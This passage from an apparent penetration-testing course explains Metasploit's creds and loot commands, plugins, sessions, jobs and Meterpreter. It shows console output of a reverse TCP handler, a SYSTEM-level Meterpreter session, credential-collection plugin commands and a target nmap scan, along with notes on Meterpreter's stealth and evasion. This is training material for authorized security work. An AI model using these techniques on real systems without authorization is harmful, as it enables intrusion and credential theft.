  creds -O <span class="hljs-number">1.2</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span>/<span class="hljs-number">24</span> <span class="hljs-comment"># Return credentials with origins in this range</span>
  creds -p <span class="hljs-number">22</span><span class="hljs-number">-25</span>,<span class="hljs-number">445</span>  <span class="hljs-comment"># nmap port specification</span>
  creds -s ssh,smb    <span class="hljs-comment"># All creds associated with a login on SSH or SMB services</span>
  creds -t NTLM       <span class="hljs-comment"># All NTLM creds</span>
  creds -j md5        <span class="hljs-comment"># All John the Ripper hash type MD5 creds</span>

Example, deleting:
  <span class="hljs-comment"># Delete all SMB credentials</span>
  creds -d -s smb
</code></pre>
<hr>
<h3 id="loot">Loot</h3>
<p>The <code>loot</code> command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.</p>
<p><strong>MSF - Stored Loot</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">msf6 &gt; loot -h

Usage: loot [<span class="hljs-keyword">options</span>]
 Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]
  Add: loot -<span class="hljs-keyword">f</span> [fname] -i [info] -<span class="hljs-keyword">a</span> [addr1 addr2 ...] -t [<span class="hljs-built_in">type</span>]
  De<span class="hljs-variable">l:</span> loot -d [addr1 addr2 ...]

  -<span class="hljs-keyword">a</span>,--<span class="hljs-built_in">add</span>          Add loot <span class="hljs-keyword">to</span> the <span class="hljs-keyword">list</span> of addresses, instead of listing
  -d,--<span class="hljs-keyword">delete</span>       Delete *<span class="hljs-keyword">all</span>* loot matching host <span class="hljs-built_in">and</span> <span class="hljs-built_in">type</span>
  -<span class="hljs-keyword">f</span>,--<span class="hljs-keyword">file</span>         File with contents of the loot <span class="hljs-keyword">to</span> <span class="hljs-built_in">add</span>
  -i,--info         Info of the loot <span class="hljs-keyword">to</span> <span class="hljs-built_in">add</span>
  -t &lt;type1,type2&gt;  Search <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">list</span> of types
  -h,--<span class="hljs-keyword">help</span>         Show this <span class="hljs-keyword">help</span> information
  -S,--<span class="hljs-built_in">search</span>       Search <span class="hljs-built_in">string</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">filter</span> by
</code></pre>
<h2 id="plugins">Plugins</h2>
<hr>
<p>Plugins are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework. These can represent commercial products that have a <code>Community Edition</code> for free use but with limited functionality, or they can be individual projects developed by individual people.</p>
<p>The use of plugins makes a pentester&#39;s life even easier, bringing the functionality of well-known software into the <code>msfconsole</code> or Metasploit Pro environments. Whereas before, we needed to cycle between different software to import and export results, setting options and parameters over and over again, now, with the use of plugins, everything is automatically documented by msfconsole into the database we are using and hosts, services and vulnerabilities are made available at-a-glance for the user. <a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin">Plugins</a> work directly with the API and can be used to manipulate the entire framework. They can be useful for automating repetitive tasks, adding new commands to the <code>msfconsole</code>, and extending the already powerful framework.</p>
<hr>
<h3 id="using-plugins">Using Plugins</h3>
<p>To start using a plugin, we will need to ensure it is installed in the correct directory on our machine. Navigating to <code>/usr/share/metasploit-framework/plugins</code>, which is the default directory for every new installation of <code>msfconsole</code>, should show us which plugins we have to our availability:</p>
<p>Plugins</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls /usr/share/metasploit-framework/plugins

aggregator<span class="hljs-selector-class">.rb</span>      beholder<span class="hljs-selector-class">.rb</span>        event_tester<span class="hljs-selector-class">.rb</span>  komand<span class="hljs-selector-class">.rb</span>     msfd<span class="hljs-selector-class">.rb</span>    nexpose<span class="hljs-selector-class">.rb</span>   request<span class="hljs-selector-class">.rb</span>  session_notifier<span class="hljs-selector-class">.rb</span>  sounds<span class="hljs-selector-class">.rb</span>  token_adduser<span class="hljs-selector-class">.rb</span>  wmap<span class="hljs-selector-class">.rb</span>
alias<span class="hljs-selector-class">.rb</span>           db_credcollect<span class="hljs-selector-class">.rb</span>  ffautoregen<span class="hljs-selector-class">.rb</span>   lab<span class="hljs-selector-class">.rb</span>        msgrpc<span class="hljs-selector-class">.rb</span>  openvas<span class="hljs-selector-class">.rb</span>   rssfeed<span class="hljs-selector-class">.rb</span>  session_tagger<span class="hljs-selector-class">.rb</span>    sqlmap<span class="hljs-selector-class">.rb</span>  token_hunter<span class="hljs-selector-class">.rb</span>
auto_add_route<span class="hljs-selector-class">.rb</span>  db_tracker<span class="hljs-selector-class">.rb</span>      ips_filter<span class="hljs-selector-class">.rb</span>    libnotify<span class="hljs-selector-class">.rb</span>  nessus<span class="hljs-selector-class">.rb</span>  pcap_log<span class="hljs-selector-class">.rb</span>  sample<span class="hljs-selector-class">.rb</span>   socket_logger<span class="hljs-selector-class">.rb</span>     thread<span class="hljs-selector-class">.rb</span>  wiki.rb
</code></pre>
<p>If the plugin is found here, we can fire it up inside <code>msfconsole</code> and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use:</p>
<p><strong>MSF - Load Nessus</strong></p>
<p>Plugins</p>
<pre><code class="lang-shell-session">msf6 &gt; load nessus

[*] Nessus Bridge <span class="hljs-keyword">for</span> Metasploit
[*] Type nessus_help <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">a</span> command listing
[*] Successfully loaded Plugin: Nessus


msf6 &gt; nessus_help

Command                     Help Text
-------                     ---------
Generic Commands            
-----------------           -----------------
nessus_connect              Connect to <span class="hljs-selector-tag">a</span> Nessus server
nessus_logout               Logout from the Nessus server
nessus_login                Login into the connected Nessus server with <span class="hljs-selector-tag">a</span> different username and 

&lt;SNIP&gt;

nessus_user_del             Delete <span class="hljs-selector-tag">a</span> Nessus User
nessus_user_passwd          Change Nessus Users Password

Policy Commands             
-----------------           -----------------
nessus_policy_list          List all polciies
nessus_policy_del           Delete <span class="hljs-selector-tag">a</span> policy
</code></pre>
<p>If the plugin is not installed correctly, we will receive the following error upon trying to load it.</p>
<p>Plugins</p>
<pre><code class="lang-shell-session">msf6 &gt; load Plugin_That_Does_Not_Exist

[-] Failed to load plugin <span class="hljs-keyword">from</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>plugins<span class="hljs-regexp">/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /u</span>sr<span class="hljs-regexp">/share/m</span>etasploit-framework<span class="hljs-regexp">/plugins/</span>Plugin_That_Does_Not_Exist.rb
</code></pre>
<p>To start using the plugin, start issuing the commands available to us in the help menu of that specific plugin. Each cross-platform integration offers us a unique set of interactions that we can use during our assessments, so it is helpful to read up on each of these before employing them to get the most out of having them at our fingertips.</p>
<hr>
<h3 id="installing-new-plugins">Installing new Plugins</h3>
<p>New, more popular plugins are installed with each update of the Parrot OS distro as they are pushed out towards the public by their makers, collected in the Parrot update repo. To install new custom plugins not included in new updates of the distro, we can take the .rb file provided on the maker&#39;s page and place it in the folder at <code>/usr/share/metasploit-framework/plugins</code> with the proper permissions.</p>
<p>For example, let us try installing <a href="https://github.com/darkoperator/Metasploit-Plugins.git">DarkOperator&#39;s Metasploit-Plugins</a>. Then, following the link above, we get a couple of Ruby (<code>.rb</code>) files which we can directly place in the folder mentioned above.</p>
<p><strong>Downloading MSF Plugins</strong></p>
<p>Plugins</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ git clone https:<span class="hljs-comment">//github.com/darkoperator/Metasploit-Plugins</span>
root@htb[/htb]$ ls Metasploit-Plugins

aggregator<span class="hljs-selector-class">.rb</span>      ips_filter<span class="hljs-selector-class">.rb</span>  pcap_log<span class="hljs-selector-class">.rb</span>          sqlmap<span class="hljs-selector-class">.rb</span>
alias<span class="hljs-selector-class">.rb</span>           komand<span class="hljs-selector-class">.rb</span>      pentest<span class="hljs-selector-class">.rb</span>           thread<span class="hljs-selector-class">.rb</span>
auto_add_route<span class="hljs-selector-class">.rb</span>  lab<span class="hljs-selector-class">.rb</span>         request<span class="hljs-selector-class">.rb</span>           token_adduser<span class="hljs-selector-class">.rb</span>
beholder<span class="hljs-selector-class">.rb</span>        libnotify<span class="hljs-selector-class">.rb</span>   rssfeed<span class="hljs-selector-class">.rb</span>           token_hunter<span class="hljs-selector-class">.rb</span>
db_credcollect<span class="hljs-selector-class">.rb</span>  msfd<span class="hljs-selector-class">.rb</span>        sample<span class="hljs-selector-class">.rb</span>            twitt<span class="hljs-selector-class">.rb</span>
db_tracker<span class="hljs-selector-class">.rb</span>      msgrpc<span class="hljs-selector-class">.rb</span>      session_notifier<span class="hljs-selector-class">.rb</span>  wiki<span class="hljs-selector-class">.rb</span>
event_tester<span class="hljs-selector-class">.rb</span>    nessus<span class="hljs-selector-class">.rb</span>      session_tagger<span class="hljs-selector-class">.rb</span>    wmap<span class="hljs-selector-class">.rb</span>
ffautoregen<span class="hljs-selector-class">.rb</span>     nexpose<span class="hljs-selector-class">.rb</span>     socket_logger<span class="hljs-selector-class">.rb</span>
growl<span class="hljs-selector-class">.rb</span>           openvas<span class="hljs-selector-class">.rb</span>     sounds.rb
</code></pre>
<p>Here we can take the plugin <code>pentest.rb</code> as an example and copy it to <code>/usr/share/metasploit-framework/plugins</code>.</p>
<p><strong>MSF - Copying Plugin to MSF</strong></p>
<p>Plugins</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo cp ./</span>Metasploit-Plugins<span class="hljs-regexp">/pentest.rb /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/plugins/</span>pentest.rb
</code></pre>
<p>Afterward, launch <code>msfconsole</code> and check the plugin&#39;s installation by running the <code>load</code> command. After the plugin has been loaded, the <code>help menu</code> at the <code>msfconsole</code> is automatically extended by additional functions.</p>
<p><strong>MSF - Load Plugin</strong></p>
<p>Plugins</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ msfconsole -q

msf6 &gt; load pentest

<span class="hljs-code">       ___         _          _     ___ _           _</span>
<span class="hljs-code">      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _</span>
<span class="hljs-code">      |  _/ -_) ' \  _/ -_|_-&lt;  _| |  _/ | || / _` | | ' \ </span>
<span class="hljs-code">      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|</span>
<span class="hljs-code">                                              |___/</span>

Version 1.6
Pentest Plugin loaded.
by Carlos Perez (carlos<span class="hljs-emphasis">_perez[at]darkoperator.com)
[*] Successfully loaded plugin: pentest

</span>
msf6 &gt; help

<span class="hljs-section">Tradecraft Commands
===================</span>

<span class="hljs-code">    Command          Description</span>
<span class="hljs-code">    -------          -----------</span>
<span class="hljs-code">    check_footprint  Checks the possible footprint of a post module on a target system.</span>


<span class="hljs-section">auto_exploit Commands
=====================</span>

<span class="hljs-code">    Command           Description</span>
<span class="hljs-code">    -------           -----------</span>
<span class="hljs-code">    show_client_side  Show matched client side exploits from data imported from vuln scanners.</span>
<span class="hljs-code">    vuln_exploit      Runs exploits based on data imported from vuln scanners.</span>


<span class="hljs-section">Discovery Commands
==================</span>

<span class="hljs-code">    Command                 Description</span>
<span class="hljs-code">    -------                 -----------</span>
<span class="hljs-code">    discover_db             Run discovery modules against current hosts in the database.</span>
<span class="hljs-code">    network_discover        Performs a port-scan and enumeration of services found for non pivot networks.</span>
<span class="hljs-code">    pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.</span>
<span class="hljs-code">    show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.</span>


<span class="hljs-section">Project Commands
================</span>

<span class="hljs-code">    Command       Description</span>
<span class="hljs-code">    -------       -----------</span>
<span class="hljs-code">    project       Command for managing projects.</span>


<span class="hljs-section">Postauto Commands
=================</span>

<span class="hljs-code">    Command             Description</span>
<span class="hljs-code">    -------             -----------</span>
<span class="hljs-code">    app_creds           Run application password collection modules against specified sessions.</span>
<span class="hljs-code">    get_lhost           List local IP addresses that can be used for LHOST.</span>
<span class="hljs-code">    multi_cmd           Run shell command against several sessions</span>
<span class="hljs-code">    multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.</span>
<span class="hljs-code">    multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.</span>
<span class="hljs-code">    multi_post          Run a post module against specified sessions.</span>
<span class="hljs-code">    multi_post_rc       Run resource file with post modules and options against specified sessions.</span>
<span class="hljs-code">    sys_creds           Run system password collection modules against specified sessions.</span>

&lt;SNIP&gt;
</code></pre>
<p>Many people write many different plugins for the Metasploit framework. They all have a specific purpose and can be an excellent help to save time after familiarizing ourselves with them. Check out the list of popular plugins below:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://nmap.org/">nMap (pre-installed)</a></td>
<td><a href="https://sectools.org/tool/nexpose/">NexPose (pre-installed)</a></td>
<td><a href="https://www.tenable.com/products/nessus">Nessus (pre-installed)</a></td>
</tr>
<tr>
<td><a href="http://blog.gentilkiwi.com/mimikatz">Mimikatz (pre-installed V.1)</a></td>
<td><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi">Stdapi (pre-installed)</a></td>
<td><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation">Railgun</a></td>
</tr>
<tr>
<td><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb">Priv</a></td>
<td><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/">Incognito (pre-installed)</a></td>
<td><a href="https://github.com/darkoperator/Metasploit-Plugins">Darkoperator&#39;s</a></td>
</tr>
</tbody>
</table>
<hr>
<h3 id="mixins">Mixins</h3>
<p>The Metasploit Framework is written in Ruby, an object-oriented programming language. This plays a big part in what makes <code>msfconsole</code> excellent to use. Mixins are one of those features that, when implemented, offer a large amount of flexibility to both the creator of the script and the user.</p>
<p>Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when we:</p>
<ol>
<li>Want to provide a lot of optional features for a class.</li>
<li>Want to use one particular feature for a multitude of classes.</li>
</ol>
<p>Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word <code>include</code>, to which we pass the name of the module as a <code>parameter</code>. We can read more about mixins <a href="https://en.wikibooks.org/wiki/Metasploit/UsingMixins">here</a>.</p>
<p>If we are just starting with Metasploit, we should not worry about the use of Mixins or their impact on our assessment. However, they are mentioned here as a note of how complex the customization of Metasploit can become.</p>
<h2 id="sessions">Sessions</h2>
<hr>
<p>MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of <code>Sessions</code>, which creates dedicated control interfaces for all of your deployed modules.</p>
<p>Once several sessions are created, we can switch between them and link a different module to one of the backgrounded sessions to run on it or turn them into jobs. Note that once a session is placed in the background, it will continue to run, and our connection to the target host will persist. Sessions can, however, die if something goes wrong during the payload runtime, causing the communication channel to tear down.</p>
<hr>
<h3 id="using-sessions">Using Sessions</h3>
<p>While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by pressing the <code>[CTRL] + [Z]</code> key combination or by typing the <code>background</code> command in the case of Meterpreter stages. This will prompt us with a confirmation message. After accepting the prompt, we will be taken back to the msfconsole prompt (<code>msf6 &gt;</code>) and will immediately be able to launch a different module.</p>
<p><strong>Listing Active Sessions</strong></p>
<p>We can use the <code>sessions</code> command to view our currently active sessions.</p>
<p>Sessions</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/psexec<span class="hljs-emphasis">_psh) &gt; sessions

</span><span class="hljs-section">Active sessions
===============</span>

<span class="hljs-code">  Id  Name  Type                     Information                 Connection</span>
<span class="hljs-code">  --  ----  ----                     -----------                 ----------</span>
<span class="hljs-code">  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501 (10.10.10.205)</span>
</code></pre>
<p><strong>Interacting with a Session</strong></p>
<p>You can use the <code>sessions -i [no.]</code> command to open up a specific session.</p>
<p>Sessions</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i <span class="hljs-number">1</span>
[*] Starting interaction <span class="hljs-keyword">with</span> <span class="hljs-number">1.</span>..

meterpreter &gt;
</code></pre>
<p>This is specifically useful when we want to run an additional module on an already exploited system with a formed, stable communication channel.</p>
<p>This can be done by backgrounding our current session, which is formed due to the success of the first exploit, searching for the second module we wish to run, and, if made possible by the type of module selected, selecting the session number on which the module should be run. This can be done from the second module&#39;s <code>show options</code> menu.</p>
<p>Usually, these modules can be found in the <code>post</code> category, referring to Post-Exploitation modules. The main archetypes of modules in this category consist of credential gatherers, local exploit suggesters, and internal network scanners.</p>
<hr>
<h3 id="jobs">Jobs</h3>
<p>If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using <code>[CTRL] + [C]</code>. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the <code>jobs</code> command to look at the currently active tasks running in the background and terminate the old ones to free up the port.</p>
<p>Other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly, even if the session dies or disappears.</p>
<p><strong>Viewing the Jobs Command Help Menu</strong></p>
<p>We can view the help menu for this command, like others, by typing <code>jobs -h</code>.</p>
<p>Sessions</p>
<pre><code class="lang-shell-session">msf6 exploit(multi/handler) &gt; jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -<span class="ruby">K        Terminate all running jobs.
</span>    -<span class="ruby">P        Persist all running jobs on restart.
</span>    -<span class="ruby">S &lt;opt&gt;  Row search filter.
</span>    -<span class="ruby">h        Help banner.
</span>    -<span class="ruby">i &lt;opt&gt;  Lists detailed information about a running job.
</span>    -<span class="ruby">k &lt;opt&gt;  Terminate jobs by job ID <span class="hljs-keyword">and</span>/<span class="hljs-keyword">or</span> range.
</span>    -<span class="ruby">l        List all running jobs.
</span>    -<span class="ruby">p &lt;opt&gt;  Add persistence to job by job ID
</span>    -<span class="ruby">v        Print more detailed info.  Use with -i <span class="hljs-keyword">and</span> -l</span>
</code></pre>
<p><strong>Viewing the Exploit Command Help Menu</strong></p>
<p>When we run an exploit, we can run it as a job by typing <code>exploit -j</code>. Per the help menu for the <code>exploit</code> command, adding <code>-j</code> to our command. Instead of just <code>exploit</code> or <code>run</code>, will &quot;run it in the context of a job.&quot;</p>
<p>Sessions</p>
<pre><code class="lang-shell-session">msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; exploit -h
<span class="hljs-keyword">Usage</span>: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        <span class="hljs-keyword">Force</span> running <span class="hljs-keyword">in</span> the foreground, even <span class="hljs-keyword">if</span> passive.
    -e &lt;opt&gt;  The payload encoder <span class="hljs-keyword">to</span> use.  <span class="hljs-keyword">If</span> <span class="hljs-keyword">none</span> <span class="hljs-keyword">is</span> specified, ENCODER <span class="hljs-keyword">is</span> used.
    -f        <span class="hljs-keyword">Force</span> the exploit <span class="hljs-keyword">to</span> run regardless <span class="hljs-keyword">of</span> the <span class="hljs-keyword">value</span> <span class="hljs-keyword">of</span> MinimumRank.
    -h        <span class="hljs-keyword">Help</span> banner.
    -j        Run <span class="hljs-keyword">in</span> the <span class="hljs-keyword">context</span> <span class="hljs-keyword">of</span> a job.

&lt;SNIP
</code></pre>
<p><strong>Running an Exploit as a Background Job</strong></p>
<p>Sessions</p>
<pre><code class="lang-shell-session">
msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; exploit -j
[*] Exploit running <span class="hljs-keyword">as</span> background job <span class="hljs-number">0.</span>
[*] Exploit completed, but <span class="hljs-keyword">no</span> <span class="hljs-keyword">session</span> was created.

[*] Started <span class="hljs-keyword">reverse</span> TCP <span class="hljs-keyword">handler</span> <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.34</span>:<span class="hljs-number">4444</span>
</code></pre>
<p><strong>Listing Running Jobs</strong></p>
<p>To list all running jobs, we can use the <code>jobs -l</code> command. To kill a specific job, look at the index no. of the job and use the <code>kill [index no.]</code> command. Use the <code>jobs -K</code> command to kill all running jobs.</p>
<p>Sessions</p>
<pre><code class="lang-shell-session">
msf6 exploit(multi/handler) &gt; jobs -l

<span class="hljs-section">Jobs
====</span>

<span class="hljs-code"> Id  Name                    Payload                    Payload opts</span>
<span class="hljs-code"> --  ----                    -------                    ------------</span>
<span class="hljs-code"> 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444</span>
</code></pre>
<p>Next up, we&#39;ll work with the extremely powerful <code>Meterpreter</code> payload.</p>
<h2 id="meterpreter">Meterpreter</h2>
<hr>
<p>The <code>Meterpreter</code> Payload is a specific type of multi-faceted, extensible Payload that uses <code>DLL injection</code> to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.</p>
<p>It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, etc.</p>
<p>For some interesting reading, check out this <a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/">post</a> on Meterpreter stageless payloads and this <a href="https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion">post</a> on modifying Metasploit templates for evasion. These topics are outside the scope of this module, but we should be aware of these possibilities.</p>
<hr>
<h3 id="running-meterpreter">Running Meterpreter</h3>
<p>To run Meterpreter, we only need to select any version of it from the <code>show payloads</code> output, taking into consideration the type of connection and OS we are attacking.</p>
<p>When the exploit is completed, the following events occur:</p>
<ul>
<li>The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.</li>
<li>The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.</li>
<li>The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.</li>
<li>Lastly, Meterpreter loads extensions. It will always load <code>stdapi</code> and load <code>priv</code> if the module gives administrative rights. All of these extensions are loaded over AES encryption.</li>
</ul>
<p>Whenever the Meterpreter Payload is sent and run on the target system, we receive a <code>Meterpreter shell</code>. We can then immediately issue the <code>help</code> command to see what the Meterpreter shell is capable of.</p>
<p><strong>MSF - Meterpreter Commands</strong></p>
<pre><code class="lang-shell-session">meterpreter &gt; help

Core Commands
=============

    Command                   Description
    <span class="hljs-comment">-------                   -----------</span>
    ?                         Help menu
    background                Backgrounds <span class="hljs-keyword">the</span> current session
    bg                        Alias <span class="hljs-keyword">for</span> background
    bgkill                    Kills a background meterpreter <span class="hljs-keyword">script</span>
    bglist                    Lists <span class="hljs-built_in">running</span> background scripts
    bgrun                     Executes a meterpreter <span class="hljs-keyword">script</span> <span class="hljs-keyword">as</span> a background thread
    channel                   Displays information <span class="hljs-keyword">or</span> control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding <span class="hljs-keyword">of</span> unicode strings
    enable_unicode_encoding   Enables encoding <span class="hljs-keyword">of</span> unicode strings
    <span class="hljs-keyword">exit</span>                      Terminate <span class="hljs-keyword">the</span> meterpreter session
    get_timeouts              Get <span class="hljs-keyword">the</span> current session <span class="hljs-keyword">timeout</span> values
    guid                      Get <span class="hljs-keyword">the</span> session GUID
    help                      Help menu
    info                      Displays information <span class="hljs-keyword">about</span> a Post module
    irb                       Open an interactive Ruby shell <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> current session
    load                      Load one <span class="hljs-keyword">or</span> more meterpreter extensions
    machine_id                Get <span class="hljs-keyword">the</span> MSF ID <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> machine attached <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> session
    migrate                   Migrate <span class="hljs-keyword">the</span> server <span class="hljs-keyword">to</span> another process
    pivot                     Manage pivot listeners
    pry                       Open <span class="hljs-keyword">the</span> Pry debugger <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> current session
    quit                      Terminate <span class="hljs-keyword">the</span> meterpreter session
    <span class="hljs-built_in">read</span>                      Reads data <span class="hljs-keyword">from</span> a channel
    resource                  Run <span class="hljs-keyword">the</span> commands stored <span class="hljs-keyword">in</span> a <span class="hljs-built_in">file</span>
    <span class="hljs-built_in">run</span>                       Executes a meterpreter <span class="hljs-keyword">script</span> <span class="hljs-keyword">or</span> Post module
    secure                    (Re)Negotiate TLV packet encryption <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> session
    sessions                  Quickly switch <span class="hljs-keyword">to</span> another session
    set_timeouts              Set <span class="hljs-keyword">the</span> current session <span class="hljs-keyword">timeout</span> values
    sleep                     Force Meterpreter <span class="hljs-keyword">to</span> go quiet, <span class="hljs-keyword">then</span> re-establish session.
    transport                 Change <span class="hljs-keyword">the</span> current transport mechanism
    use                       Deprecated <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> <span class="hljs-string">"load"</span>
    uuid                      Get <span class="hljs-keyword">the</span> UUID <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> current session
    <span class="hljs-built_in">write</span>                     Writes data <span class="hljs-keyword">to</span> a channel
</code></pre>
<p>Some of these commands are also available in the module cheat sheet for reference.</p>
<p>The main idea we need to get about Meterpreter is that it is just as good as getting a direct shell on the target OS but with more functionality. The developers of Meterpreter set clear design goals for the project to skyrocket in usability in the future. Meterpreter needs to be:</p>
<ul>
<li>Stealthy</li>
<li>Powerful</li>
<li>Extensible</li>
</ul>
<hr>
<h3 id="stealthy">Stealthy</h3>
<p>Meterpreter, when launched and after arriving on the target, resides entirely in memory and writes nothing to the disk. No new processes are created either as Meterpreter injects itself into a compromised process. Moreover, it can perform process migrations from one running process to another.</p>
<p>With the now updated msfconsole-v6, all Meterpreter payload communications between the target host and us are encrypted using AES to ensure confidentiality and integrity of data communications.</p>
<p>All of these provide limited forensic evidence to be found and also little impact on the victim machine.</p>
<hr>
<h3 id="powerful">Powerful</h3>
<p>Meterpreter&#39;s use of a channelized communication system between the target host and the attacker proves very useful. We can notice this first-hand when we immediately spawn a host-OS shell inside of our Meterpreter stage by opening a dedicated channel for it. This also allows for the use of AES-encrypted traffic.</p>
<hr>
<h3 id="extensible">Extensible</h3>
<p>Meterpreter&#39;s features can constantly be augmented at runtime and loaded over the network. Its modular structure also allows new functionality to be added without rebuilding it.</p>
<hr>
<h3 id="using-meterpreter">Using Meterpreter</h3>
<p>We have already delved into the basics of Meterpreter in the Payloads section. Now, we will look at the real strengths of the Meterpreter shell and how it can bolster the assessment&#39;s effectiveness and save time during an engagement. We start by running a basic scan against a known target. We will do this a-la-carte, doing everything from inside msfconsole to benefit from the data tracking on our target.</p>
<p><strong>MSF - Scanning Target</strong></p>
<pre><code class="lang-shell-session">msf6 &gt; db_nmap -sV -p- -T5 -A <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span>

[*] <span class="hljs-string">Nmap:</span> Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2020-09-03 09:55 UTC</span>
[*] <span class="hljs-string">Nmap:</span> Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.15</span>
[*] <span class="hljs-string">Nmap:</span> Host is up (<span class="hljs-number">0.021</span>s latency).
[*] <span class="hljs-string">Nmap:</span> Not <span class="hljs-string">shown:</span> <span class="hljs-number">65534</span> filtered ports
[*] <span class="hljs-string">Nmap:</span> PORT   STATE SERVICE VERSION
[*] <span class="hljs-string">Nmap:</span> <span class="hljs-number">80</span>/tcp open  http    Microsoft IIS httpd <span class="hljs-number">6.0</span>
[*] <span class="hljs-string">Nmap:</span> | http-<span class="hljs-string">methods:</span>
[*] <span class="hljs-string">Nmap:</span> |_  Potentially risky <span class="hljs-string">methods:</span> TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
[*] <span class="hljs-string">Nmap:</span> |_http-server-<span class="hljs-string">header:</span> Microsoft-IIS/<span class="hljs-number">6.0</span>
[*] <span class="hljs-string">Nmap:</span> |_http-<span class="hljs-string">title:</span> Under Construction
[*] <span class="hljs-string">Nmap:</span> | http-webdav-<span class="hljs-string">scan:</span>
[*] <span class="hljs-string">Nmap:</span> |   Public <span class="hljs-string">Options:</span> OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
[*] <span class="hljs-string">Nmap:</span> |   WebDAV <span class="hljs-string">type:</span> Unknown
[*] <span class="hljs-string">Nmap:</span> |   Allowed <span class="hljs-string">Methods:</span> OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
[*] <span class="hljs-string">Nmap:</span> |   Server <span class="hljs-string">Date:</span> Thu, <span class="hljs-number">03</span> Sep <span class="hljs-number">2020</span> <span class="hljs-number">09</span>:<span class="hljs-number">56</span>:<span class="hljs-number">46</span> GMT
[*] <span class="hljs-string">Nmap:</span> |_  Server <span class="hljs-string">Type:</span> Microsoft-IIS/<span class="hljs-number">6.0</span>
